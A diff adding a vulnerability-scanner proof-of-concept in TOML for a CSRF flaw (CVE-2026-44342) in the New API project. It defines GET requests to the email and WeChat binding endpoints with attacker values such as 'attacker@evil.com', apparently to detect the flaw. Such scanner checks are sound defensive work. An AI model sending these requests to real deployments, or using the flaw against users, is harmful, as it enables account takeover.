@@ -1,0 +1,35 @@
+[info]
+id = "POC-AVE-2026-0037"
+name = "New API 邮箱绑定接口 CSRF 漏洞 PoC"
+author = "AVE"
+severity = "medium"
+tags = ["csrf", "cve-2026-44342", "new-api"]
+description = "New API 在 v0.12.0-alpha.1 之前，/api/oauth/email/bind 使用 GET 请求处理邮箱绑定操作，存在 CSRF 漏洞。攻击者可构造恶意链接诱导用户点击，将攻击者控制的邮箱绑定到用户账户。"
+vuln_id = ["CVE-2026-44342", "AVE-2026-0037"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/oauth/email/bind"
+
+[poc.requests.query]
+email = "attacker@evil.com"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/api/oauth/wechat/bind"
+
+[poc.requests.query]
+code = "attacker_code"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
